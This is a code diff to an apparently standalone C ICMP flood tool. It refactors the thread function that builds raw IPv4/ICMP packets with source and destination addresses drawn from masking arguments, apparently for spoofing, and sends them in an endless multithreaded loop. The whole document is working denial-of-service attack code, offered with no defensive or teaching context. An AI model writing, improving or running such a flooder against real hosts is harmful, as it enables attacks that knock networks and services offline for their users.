@@ -34,10 +34,12 @@ void IcmpFloodPrintUsage(void)
 
 void *GenerateIcmpFlood(void *data)
 {
-    int thread_id = *((int*) data);
     int sock = MakeRawSocket(IPPROTO_ICMP);
     struct iphdr ipv4_h;
-    ipv4_h = PrepareEmptyIphdr();
+    PrepareEmptyIphdr(&ipv4_h);
+    ipv4_h.tot_len = sizeof(struct iphdr);
+    ipv4_h.tot_len += sizeof(struct icmp);
+    ipv4_h.protocol = IPPROTO_ICMP;
 
     // icmp settings
     char icmp_buf[sizeof(struct icmp)] = {0, };
@@ -48,6 +50,9 @@ void *GenerateIcmpFlood(void *data)
     icmp_h_ptr->icmp_id = getpid();
 
     MaskingArguments icmp_now;
+
+    char packet[BUFFER_SIZE];
+
     while (1) {
         // *** begin of critical section ***
         pthread_mutex_lock(&g_icmp_mutex);
@@ -61,15 +66,13 @@ void *GenerateIcmpFlood(void *data)
         }
         g_icmp_num_generated_in_sec++;
         g_icmp_num_total++;
+        
         // *** end of critical section ***
+        pthread_mutex_unlock(&g_icmp_mutex);
 
         // make ipv4 header
-        pthread_mutex_unlock(&g_icmp_mutex);
-        ipv4_h.tot_len = sizeof(struct iphdr);
-        ipv4_h.protocol = IPPROTO_ICMP;
         ipv4_h.saddr = inet_addr(icmp_now.src);
         ipv4_h.daddr = inet_addr(icmp_now.dest);
-        ipv4_h.tot_len += sizeof(struct icmp);
         ipv4_h.check = IphdrGetChecksum((uint16_t *) &ipv4_h,
                 sizeof(struct iphdr) + sizeof(struct icmp));
 
@@ -80,11 +83,8 @@ void *GenerateIcmpFlood(void *data)
                 sizeof(struct icmp));
         
         // make and send packet
-        char *packet = AssembleIphdrWithData(ipv4_h,
-                icmp_h_ptr,
-                sizeof(struct icmp));
-        SendPacket(sock, ipv4_h, packet, icmp_now.port);
-        free(packet);
+        AssembleIphdrWithData(packet, &ipv4_h, icmp_h_ptr, sizeof(struct icmp));
+        SendPacket(sock, packet, ipv4_h.daddr, ipv4_h.tot_len, icmp_now.port);
     }
     close(sock);
     return NULL;
@@ -146,7 +146,7 @@ void IcmpFloodMain(char *argv[])
         printf("thread %d joined\n", i);
     }
     pthread_mutex_destroy(&g_icmp_mutex);
-    printf("Icmp Flooding finished\nTotal %lu packets sent.\n",
+    printf("Icmp Flooding finished\nTotal %u packets sent.\n",
             g_icmp_num_total);
     pthread_exit(NULL);
     return;
